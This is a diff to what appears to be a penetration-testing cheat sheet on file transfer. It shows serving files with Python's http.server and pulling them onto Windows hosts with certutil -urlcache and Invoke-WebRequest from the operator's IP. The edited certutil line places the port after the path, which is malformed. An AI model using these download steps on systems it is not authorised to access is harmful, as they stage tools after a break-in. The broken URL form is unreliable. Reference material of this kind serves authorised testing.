@@ -13,7 +13,7 @@ python3 -m http.server <port>
 # Download Files (from you web server)
 ~~~
 **Windows**
-certutil.exe -urlcache -f http://<link to file>:<port> <name file>
+certutil.exe -urlcache -f http://<address>/<path to file>:<port> <name file>
 iwr "http://<your-ip>:<port>/<path to file>" -o <output file>
 (iwr = invoke-webrequest)
 **Linux**
